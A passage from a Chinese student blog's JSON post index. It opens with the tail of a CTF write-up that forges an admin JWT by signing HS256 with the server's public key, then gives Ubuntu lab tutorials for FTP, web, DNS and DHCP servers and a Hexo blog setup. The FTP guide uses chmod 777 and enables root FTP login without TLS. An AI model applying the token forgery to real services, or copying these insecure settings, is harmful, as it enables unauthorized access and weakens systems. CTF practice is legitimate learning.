key=public,algorithm='HS256') 需要将网页上获得的公钥中 \\n 替换成换行，并且这里 priv 之前是为 other ，需要修改为 admin 身份，用户名 name 猜测为之前认证字段的 iscc19 需要额外在python2环境下安装 jwt 模块： pip install PyJWT运行时候需要对 algorithms.py 中 prepare_key 中非法字符注释，否则程序报错。 运行脚本获得字符串 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaXNjYzE5IiwicHJpdiI6ImFkbWluIn0.bEza2gXi7_q9qPFTSgbu8wWRpmHqHd1FFa-rJKY_38c 带入即可获取 admin 信息 访问 http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277 获得 flag 参考链接：https://www.anquanke.com/post/id/145540 misc（等我考试完就更）","tags":[{"name":"CTF","slug":"CTF","permalink":"http://fzykn06.github.io/tags/CTF/"}]},{"title":"ubuntu16.04 搭建ftp服务器","date":"2019-05-11T07:35:38.000Z","path":"2019/05/11/ubuntu16-04-搭建ftp服务器/","text":"前言网络操作系统的实验，做这个的时候心态大崩，各种弱智问题出现，差点没磕死在桌上！顺带一句，垃圾inode，禁我虚拟机网卡。。。。 实验准备ubuntu16.04 win7各一台，两个主机需要建立一个局域网，vm很容易实现这个事，ubuntu还需要外网网卡 实验开始安装vsftpd1sudo apt-get install vsftpd 修改/etc/vsftpd.conf文件1sudo vim /etc/vsftpd.conf 修改内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157# Example config file /etc/vsftpd.conf## The default compiled in settings are fairly paranoid. This sample file# loosens things up a bit, to make the ftp daemon more usable.# Please see vsftpd.conf.5 for all compiled in defaults.## READ THIS: This example file is NOT an exhaustive list of vsftpd options.# Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd's# capabilities.### Run standalone? vsftpd can run either from an inetd or as a standalone# daemon started from an initscript.listen=NO## This directive enables listening on IPv6 sockets. By default, listening# on the IPv6 \"any\" address (::) will accept connections from both IPv6# and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6# sockets. If you want that (perhaps because you want to listen on specific# addresses) then you must run two copies of vsftpd with two configuration# files.listen_ipv6=YES## Allow anonymous FTP? (Disabled by default).anonymous_enable=NO## Uncomment this to allow local users to log in.local_enable=YES## Uncomment this to enable any form of FTP write command.write_enable=YES## Default umask for local users is 077. You may wish to change this to 022,# if your users expect that (022 is used by most other ftpd's)local_umask=022## Uncomment this to allow the anonymous FTP user to upload files. This only# has an effect if the above global write enable is activated. Also, you will# obviously need to create a directory writable by the FTP user.#anon_upload_enable=YES## Uncomment this if you want the anonymous FTP user to be able to create# new directories.#anon_mkdir_write_enable=YES## Activate directory messages - messages given to remote users when they# go into a certain directory.dirmessage_enable=YES## If enabled, vsftpd will display directory listings with the time# in your local time zone. The default is to display GMT. The# times returned by the MDTM FTP command are also affected by this# option.use_localtime=YES## Activate logging of uploads/downloads.xferlog_enable=YES## Make sure PORT transfer connections originate from port 20 (ftp-data).connect_from_port_20=YES## If you want, you can arrange for uploaded anonymous files to be owned by# a different user. Note! Using \"root\" for uploaded files is not# recommended!#chown_uploads=YES#chown_username=whoever## You may override where the log file goes if you like. The default is shown# below.xferlog_file=/var/log/vsftpd.log## If you want, you can have your log file in standard ftpd xferlog format.# Note that the default log file location is /var/log/xferlog in this case.xferlog_std_format=YES## You may change the default value for timing out an idle session.#idle_session_timeout=600## You may change the default value for timing out a data connection.#data_connection_timeout=120## It is recommended that you define on your system a unique user which the# ftp server can use as a totally isolated and unprivileged user.#nopriv_user=ftpsecure## Enable this and the server will recognise asynchronous ABOR requests. Not# recommended for security (the code is non-trivial). Not enabling it,# however, may confuse older FTP clients.#async_abor_enable=YES## By default the server will pretend to allow ASCII mode but in fact ignore# the request. Turn on the below options to have the server actually do ASCII# mangling on files when in ASCII mode.# Beware that on some FTP servers, ASCII support allows a denial of service# attack (DoS) via the command \"SIZE /big/file\" in ASCII mode. vsftpd# predicted this attack and has always been safe, reporting the size of the# raw file.# ASCII mangling is a horrible feature of the protocol.#ascii_upload_enable=YES#ascii_download_enable=YES## You may fully customise the login banner string:ftpd_banner=Welcome to blash FTP service.## You may specify a file of disallowed anonymous e-mail addresses. Apparently# useful for combatting certain DoS attacks.#deny_email_enable=YES# (default follows)#banned_email_file=/etc/vsftpd.banned_emails## You may restrict local users to their home directories. See the FAQ for# the possible risks in this before using chroot_local_user or# chroot_list_enable below.#chroot_local_user=YES## You may specify an explicit list of local users to chroot() to their home# directory. If chroot_local_user is YES, then this list becomes a list of# users to NOT chroot().# (Warning! chroot'ing can be very dangerous. If using chroot, make sure that# the user does not have write access to the top level directory within the# chroot)chroot_local_user=YESchroot_list_enable=YES# (default follows)chroot_list_file=/etc/vsftpd.chroot_list## You may activate the \"-R\" option to the builtin ls. This is disabled by# default to avoid remote users being able to cause excessive I/O on large# sites. However, some broken FTP clients such as \"ncftp\" and \"mirror\" assume# the presence of the \"-R\" option, so there is a strong case for enabling it.#ls_recurse_enable=YES## Customization## Some of vsftpd's settings don't fit the filesystem layout by# default.## This option should be the name of a directory which is empty. Also, the# directory should not be writable by the ftp user. This directory is used# as a secure chroot() jail at times vsftpd does not require filesystem# access.secure_chroot_dir=/var/run/vsftpd/empty## This string is the name of the PAM service vsftpd will use.pam_service_name=ftp## This option specifies the location of the RSA certificate to use for SSL# encrypted connections.rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pemrsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.keyssl_enable=NO## Uncomment this to indicate that vsftpd use a utf8 filesystem.utf8_filesystem=YESallow_writeable_chroot=YES 对于上面的文件解释一下： listen=NO 是否开启监听ipv4和ipv6数据 anonymous_enable=NO 拒绝匿名登陆 write_able=YES 设置可以上传文件，这个设置可以看个人的需要 xferlog_enable=YES 开启日志记录 xferlog_file=/var/log/vsftpd.log 设置日志文件路径 xferlog_std_format=YES 设置日志格式为标准输出 connetct_from_port_20=YES 绑定20端口 ftpd_banner=welcome to FTP service. 欢迎语句，在使用shell时可以看到 chroot_local_user=YES chroot_list_enable=YES chroot_list_file=/etc/vsftpd.chroot_list 这三个配置实现的功能是：用户被限制在自己的主目录下。用户名单来源于/etc/vsftpd.chroot_list pam_service_name=ftp 原配置中为vsftpd，ubuntu用户需要更改成ftp utf8_filesystem=YES 编码统一为utf8编码，可以识别中文，防止乱码 创建用户组1234567mkdir /home/username //sudo useradd -d /home/username -m username -g ftp //在文件夹中创建用户名sudo passwd username//输入用户密码mkdir /home/username/pubchmod 777 -R /home/username/pub //新建一个pub目录用于存放文件，并赋予全部访问权限usermod -s /sbin/nologin username //限制用户username只能通过ftp登陆，而不能直接登陆服务器 将创建的用户加入白名单1sudo vim /etc/vsftp.chroot_list 然后重启ftp服务 1sudo service vsftpd restart 测试首先在命令行内测试： 1ftp localhost 查看文件夹内文件 可以看见刚刚创建的共享文件夹pub 打开win7从资源管理器上进行登陆 ftp://192.168.112.129 输入账号密码即可登陆 在服务器端浏览器中输入ftp://localhost 登陆本地账户的账号密码： 在客户端浏览器输入ftp://192.168.112.129 登陆账号同样可以进行查看文件 总结若在测试阶段，发现root用户登陆不了，即出现下面这种报错： 是因为root用户默认在ftp的黑名单中，这时我们只需要改变/etc/ftpusers中root注释掉就行 然后重启一下ftp服务,即可成功登陆 1sudo service vsftpd restart 若出现这种情况，则是因为chroot不可写 在配置文件/etc/vsftpd.conf中结尾加入一行 1allow_writeable=YES 然后重启服务即可解决问题 参考链接：https://blog.csdn.net/qq_33279781/article/details/73607466https://blog.csdn.net/timothy93bp/article/details/77527531https://blog.csdn.net/bluishglc/article/details/42398811","tags":[{"name":"Subject","slug":"Subject","permalink":"http://fzykn06.github.io/tags/Subject/"}]},{"title":"ubuntu16.04 搭建Web服务器","date":"2019-05-05T11:10:31.000Z","path":"2019/05/05/ubuntu16-04-搭建Web服务器/","text":"前言网络操作系统的实验 这个实验大家应该都可以吧，基本有学php的都会搭建出web服务器 安装mysql1sudo apt-get install mysql-server mysql-client 这边可能会让你输入数据库的密码，我们设置一下就好了，是root用户的密码，以后登录数据库用的 安装Apache21sudo apt-get install apache2 安装完成之后，打开浏览器，查看localhost，看见It works！的Apache测试页，则说明已经安装上去了 安装php7.0我们可以直接安装php7和apache的php7的模块 1sudo apt-get install php7.0 libapache2-mod-php7.0 安装完后重启apache2 1sudo /etc/init.d/apache2 restart 写个网页验证一下1sudo vim /var/www/html/hello.php php文件必须放在这个文件夹下面，不然网页会打不开 然后在浏览器内就可以看见了 localhost/hello.php 参考链接： https://blog.csdn.net/xyx107/article/details/79413750","tags":[{"name":"Subject","slug":"Subject","permalink":"http://fzykn06.github.io/tags/Subject/"}]},{"title":"Ubuntu 16.04 搭建DNS服务器","date":"2019-04-25T12:33:15.000Z","path":"2019/04/25/Ubuntu-16-04-搭建DNS服务器/","text":"前言网络操作系统实验二 实验环境及原理实验环境：vmware workstations 15 ubuntu 16.04DNS 是域名系统 (Domain Name System) 的缩写，它是由解析器和域名服务器组成的。域名服务器是指保存有该网络中所有主机的域名和对应IP地址，并具有将域名转换为IP地址功能的服务器其中域名必须对应一个IP地址，而IP地址不一定有域名。DNS就是进行域名!解析的服务器 前期的准备需要两台win7系统和一台ubutun系统，在虚拟机win7和ubuntu上建立一张网卡，使两个系统在一个局域网上(utbuntus上还应该有一张能够连接外网的网卡，我们需要连接外网下载相关文件) 安装bind91sudo apt install bind9 bind9utils bind9-doc 配置BIND9的ipv4模式这步是将bind9设置为只支持iPV4地址，如果需要用到ipv6的话尽可以跳过这一步。 先修改bind9的systemd unit file: 1sudo systemctl edit --full bind9 也可以直接修改文件 1sudo vim /etc/systemd/system/multi-user.target.wants/bind9.service 文件内容如下：在ExecStart这行最后加上 -4 就可以了 修改配置之后，需要重启BIND9，因为systemd的unit file 也变了，所以需要重新载入 12sudo systemctl daemon-reloadsudo systemctl restart bind9 修改配置文件named.conf.options该文件在/etc/bind/named.conf.options 需要修三处： 1sudo vim /etc/bind/named.conf.options acl 部分：acl 是控制哪些客户端可以连接到这个 DNS 上的，支持子网掩码方式，例子中我把 192.168.112.0/24 网段中的所有 IP 都设为了可访问。 recursion 字段：设置成 yes，表示允许递归 DNS 查询。 allow-recursion 字段：允许递归查询的客户端范围，这里设置成了之前在 acl 中声明的 trusted。 listen-on 字段：表示 DNS 服务监听在哪个地址上，填写本地 IP 即可。 allow-transfer 字段：设置成 none 表示不允许其他 DNS 服务器从本 DNS 服务器中查询。 forwarders 字段：原因是我们的内网 DNS 服务只提供了很有限的几条 DNS 记录，如果不做点什么的话，APT 源的地址都解析不了。BIND9 提供 DNS 查询的转发机制，当本地 DNS 查询不到，将查询转发到 forwarders 上，并把查询结果缓存到本地 DNS 上，这样问题就解决了。本文使用的是国内公网 DNS：114.114.114.114，大家可以根据自己的需求进行修改。 修改配置文件 named.conf.local假设搭建的内网 DNS 要解析的域名为 fzy.com，那么 /etc/bind/named.conf.local 内容应改为： 1sudo vim /etc/bind/named.conf.local 修改 zone 文件zone在”/etc/bind/zones/db.fzy.com”;，需要在对应的目录下建立该文件。进入bind文件夹内，打开命令台： 1234sudo su mkdir zonescd zonestouch db.fzy.com 1sudo vim /etc/bind/zones/db.fzy.com 需要注意的几点是： 不要漏掉域名后面的点，例如：testing.fzy.com. 我们需要的是A 类型的记录，但是 NS 类型的记录也不要漏掉，不然会报错的。 SOA 类型的记录目前我还不能确定是不是必须，待验证过后再做更新，在这之前，大家还是也把这部分加上吧。 检查 DNS 配置bind9 自带了检查配置文件语法正确性的工具，这可以降低排查错误的难度，所以在进一步测试 DNS 功能之前，我们先来好好利用这些工具检查一下前几步配置是否正确吧。 先来检查 named.conf.* 文件，如果运行该命令没有任何输出的话，就说明配置一切 OK，如果有的话，根据提示修改 1sudo named-checkconf 下面就是出错的提示，根据提示作出相应的修改： 在114.114.114.114后面忘记了分号，补好保存，再检测： 接下来用命令 named-checkzone 检查 zone 文件，命令格式如下： 1sudo named-checkzone fzy.com /etc/bind/zones/db.fzy.com 第一个参数 是域名，第二参数 是 zone 文件， 如果输出结果如上，配置正确，如果有问题的话，还是要根据提示具体问题具体分析。 验证经过这些配置，终于可以验证一下 DNS 是否能正常工作了，先重启 bind9 1sudo systemctl restart bind9.service 接下来要用 nslookup 检查刚刚配置的域名能否正常解析，如果系统里没有这个命令，输入一下命令安装： 1sudo apt install -y dnsutils 输入以下命令，可以看到 testing.fzy.com 正确的解析成了 192.168.112.201。则成功的配置了 DNS！ 1nslookup testing.fzy.com 开启另一台win7主机当做testing.fzy.com的服务器，设置静态ip： 再设置另一台win7的dns地址： ping域名 总结在最后的验证中，如果出现的是以下内容： 原因是没有更新/etc/resolv.conf以指向BIND服务器，需要进行以下操作： 1sudo vim /etc/network/interfaces 1sudo vim /etc/resolv.conf 参考链接： https://www.jianshu.com/p/409cd51619d0https://www.cnblogs.com/starof/p/4286268.html","tags":[{"name":"Subject","slug":"Subject","permalink":"http://fzykn06.github.io/tags/Subject/"}]},{"title":"ubuntu 16.04 搭建DHCP服务器","date":"2019-04-21T01:30:51.000Z","path":"2019/04/21/ubuntu-16-04-搭建DHCP服务器/","text":"前言网络操作系统课程的实验课程 实验过程实验环境： VMware Workstation 15.0.0 ubuntu 16.04 实验原理： DHCP服务器是为客户端机器分配IP地址的，所有分配的IP地址都保存在DHCP服务器的数据库中。为了在子网中实现DHCP分配IP地址，需要在目标主机上安装配置DHCP服务 安装DHCP服务安装isc-dhcp-server: 1sudo apt install isc-dhcp-server DHCP的主要配置文件有两个，分别位于/etc/default/isc-dhcp-server 和 /etc/dhcp/dhcpd.conf 配置DHCP服务首先要知道目标主机的网卡名称，使用命令： 1ifconfig 得到以下信息： 我们可以看到，目标主机有一张网卡ens33是可以使用的，部分机型有两张网卡，如果两张网卡都可以使用，可以一张外网一张内网，如果两张网卡只有一张有用，那么选择有用的网卡进行操作。接下来就是配置 /etc/default/isc-dhcp-server 文件。 1sudo vim /etc/default/isc-dhcp-server 将INTERFACES的内容补充为目标主机的网卡名称ens33 (想要更改里面的内容，按 i 进入插入模式，esc 退出插入模式 ：wq 保存退出) 保存退出 配置 /etc/dhcp/dhcpd.conf 文件： 1sudo vim /etc/dhcp/dhcpd.conf 文件中需要配置的是域名和子网ip等信息，对于第一文件片中的option domain-name “example.org” 不用修改，下一行的domain-name-server 需要注释掉在第二行片段中补充。 下面这个文件片段中的白色部分全是新添加的信息。目标主机的子网ip为192.168.75.153，因此subnet为192.168.75.0，DHCP分配范围设置为200-253，其余的地址留给广播和静态ip。网关和DNS均设置为192.168.75.1，广播地址为192.168.75.255，ntp-server和netbios-name-server设置与DNS一致，netbios-node-type默认为8 （此处的ip地址需要根据自己的实际情况来分配！） 保存退出 配置完成之后重启DHCP服务器： 1sudo service isc-dhcp-server restart 查看dhcp是否正常运行： 1sudo netstat -uap 当显示的dhcpd的program name时表示dhcp服务安装配置启动成功 配置过程中的调试第一次配置过程中的很可能出现配置失败无法启动dhcp的情况，可以查看日志来寻找错误的地方： 1vim /var/log/syslog 上面记录了失败的原因，定位到行，能比较少有效的减少花在错误配置上面的分析时间。 例如：我之前在配置时出现了配置名称没有全，但是配置失败，查看日志出现以下内容，红框内为报错，黄框内为错误行所在的地方！ 或者使用 123sudo netstat -nupl | grep dhcpd或sudo dhcpd -d 总结再后面复现的时候发现，我更改ip地址池内的ip后，重新获取ip，却没能实现，我曾经去个网站找原因，包括一些外国网站，有发现说是isc-dhcp-server的bug，然后我尝试去找解决方法，无果。后面同学说要将vm中的dhcp关掉再获取即可解决： （注意：这边要关掉需要管理员权限！） 关掉vm中的dhcp后要将原来网卡的dhcp进程杀死在开启重新获取ip： 12sudo dhclient ens33 -rsudo dhclient ens33 然后重新查看ip发现真的重新获取到了ip！很感谢！ 参考链接： https://blog.csdn.net/u010177634/article/details/53044777https://blog.csdn.net/Frank_Abagnale/article/details/79283209","tags":[{"name":"Subject","slug":"Subject","permalink":"http://fzykn06.github.io/tags/Subject/"}]},{"title":"windows上使用hexo + github 搭建本地博客","date":"2019-04-20T11:23:21.000Z","path":"2019/04/20/windows上使用hexo-github-搭建本地博客/","text":"前言以前看见同学有github上的博客很牛逼，也很羡慕，想想自己要是能搭多好啊，但是能力有限，现在终于搭建起来了，嘻嘻~虽然中间的过程很烦躁，无数次的推倒重新搭建，差点就崩溃了，中间参考了很多很多的博文，很感谢各位博主！我只能记起部分的博文，将在后面展现！ 前期的准备代理！这东西很重要，我们下载下面的这些东西，需要到外面去下载，所以有它比较方便，另外我们要不断的访问github也是要的，不然慢慢爬吧~ node.js下载： https://nodejs.org/zh-cn/ git下载： https://git-scm.com/download/win node.js安装下载好.msi文件后，一路next就好了（强烈建议不要安装在系统盘） 安装好后，打开cmd命令行，执行下面两个命令： 12node -vnpm -v 如下图即为安装成功： git安装下载好的git，一直next就行 安装之后找个空白的地方右键，出现下面两个选项则说明成功： 注意：一般出于安全考虑，只有在Git Bash Here中才能进行Git的相关操作。如果需要在cmd命令行里调用Git，那么就要配置电脑的环境变量Path，或者在安装的时候选择use Git from the Windows Command Prompt。这个可有可无，影响不大，成功配置的界面如图:使用以下命令： 1git --version github注册及建库注册github账号： 新建一个库： 取库名： 注意了，如果说你在上面这张图里取库名的时候，username不是跟前面的这个名字一样，后面真的很麻烦，亲测！所以为了省事还是一样的吧！我出现过下面这种情况： 后面的解决方法就是按照红圈的里面的这个区更改，可以参考下面博客： https://blog.csdn.net/dajian790626/article/details/78595684 里面很详细。 在建好的项目右侧有个settings按钮，点击它，向下拉到GitHub Pages，你会看到那边有个网址，访问它，你将会惊奇的发现该项目已经被部署到网络上，能够通过外网来访问它。 然后你就会出现上面一行绿的，上面有外网的网址，就是你的博客地址 安装hexo进入你要在本地存放博客的地方，我存放在e盘的github/blog下面，所以进入该目录下： 输入命令： 1npm install hexo -g 开始安装hexo，并出现以下界面即为安装成功： 输入代码检验: 1hexo -v 如图即为成功安装： 初识化该文件夹： 若看见Start blogging with Hexo！就可以啦，接下来就是安装所需要的组件： 1npm install 在本地体验下hexo，输入代码： 12hexo g //生成文件hexo s //开启服务 在浏览器输入localhost：4000就能访问到啦~ 将hexo与github连接起来在你放博客的文件夹内，右键打开Git Bash Here，绑定user.name和user.email，命令： 12git config --global user.name \"计算机账户名\"git config --global user.email \"github注册email\" 输入： 12cd ~/.sshls 查看是否有.ssh的文件夹，若ls后出现该文件下的内容，下图说明存在： 输入： 1ssh-keygen -t rsa -C \"你的email地址\" 并连续三下回车，生成秘钥，最后得到两个文件：id_rsa和id_rsa.pub（默认存储路径是：C:\\Users\\Administrator.ssh）。 输入： 1eval \"$(ssh-agent -s)\" 添加密钥到ssh-agent 再输入： 1ssh-add ~/.ssh/id_rsa 添加生成的SSH key到ssh-agent 登录github，点击头像下的settings， 添加ssh： 新建一个new ssh key，将id_rsa.pub文件里的内容复制上去 输入ssh -T git@github.com，测试添加ssh是否成功。如果看到Hi后面是你的用户名，就说明成功了 问题：假如ssh-key配置失败，那么只要以下步骤就能完全解决 首先，清除所有的key-pair 12ssh-add -Drm -r ~/.ssh 删除你在github中的public-key 重新生成ssh密钥对 1ssh-keygen -t rsa -C \"xxx@xxx.com\" 接下来正常操作 在github上添加公钥public-key: 1、首先在你的终端运行 xclip -sel c ~/.ssh/id_rsa.pub将公钥内容复制到剪切板 2、在github上添加公钥时，直接复制即可 3、保存 测试：在终端 ssh -T git@github.com 文件配置在blog文件夹里面找到_config.yml,配置其末尾的deploy里面的值： 第二项的值就在你github项目里的ssh（右下角）clone一下就好了 上传文件将要上传的文件放入下图路径的文件夹内： 注意：文件格式都要是.md格式的，所以要学一下markdown的语法。 在生成以及部署文章之前，需要安装一个扩展： 1npm install hexo-deployer-git --save 使用编辑器编好文章，那么就可以使用命令：hexo d -g，生成以及部署了 部署成功后访问你的地址：http://用户名.github.io。那么将看到生成的文章 选主题如果不喜欢默认的这个主题可以到这个地方去挑选。选择好自己喜欢的主题之后点击主题名进入发布人的github。我当时选择了好几种主题，最后配置失败，才默默选了参考博客里面的这个主题。 复制主题链接然后回到blog目录下，找到并进入theme文件夹右键选择git bash here 输入git clone +你选择的主题链接 下载所选主题 然后可以将主题文件夹名修改成较为简便好记的名字，这里修改成tomotoes然后在blog目录下的_config.yml配置文件中，也就是刚才说的theme配置修改成所选的主题名 然后在blog目录下打开git输入hexo s，本地预览效果 可见虽然主题更换了，但是一些css和js特效并没有显示出来，可能是这个主题需要特殊的一些配置文件，这时候我们就需要进入设计者的github主页中寻找接下来需要的设置。 修改主题配置我们到设计者的github下，在主题下载链接下面会发现有主题的配置的要求： 打开Useage下面的文档链接，按照方框内的三项去配置即可，这边我就不一一截图了！ 注意：这个配置很重要，不然到时候会有各种错误，我就是因为没有很好的配置各主题导致了各种错误，到最后屈服于这个主题！然后要注意你复制进去的代码是否是中文符号，比如说冒号！ 及冒号后面是否有英文格式的一个空格！ 发布配置完上面的就可以按照正常的发布了，第一次发布的博文会比较慢显示，要等会，后面就快了！ 博文放图片之前我不知道怎么放图片在这上面，请教了别人，然后看了其他的博文hexo中的_config.yml中的post_asset_folder值改为true 然后在在Hexo目录下打开Git Brsh，执行一个下载上传图片插件的命令 1npm install hexo-asset-image --save 继续在Git Brsh下利用 1hexo n \"文件名\" 来生成md的文件，这时就会在同级的目录下生成一个同名的文件夹。 在.md的文件中要插入图片时，先要把所要插入的图片放在生成的同名文件夹下。 2.利用markdown的语法将文件引入文章中。最好用绝对路径（不然容易会出现白屏的现象，不知是没有加载上去，还是不能上传相对路径）： 3.最后再提交一下 结束语这篇博文写了很久，但应该是很实用，自己亲测的方法，还是可以的。也花了我很长的时间搭建博客，好辛苦的。参考博客链接： 搭建： https://foxgrin.github.io/posts/29757/?tdsourcetag=s_pctim_aiomsg找错： https://blog.csdn.net/dajian790626/article/details/78595684放图： https://blog.csdn.net/qq_38148394/article/details/79997971","tags":[{"name":"start","slug":"start","permalink":"http://fzykn06.github.io/tags/start/"}]}]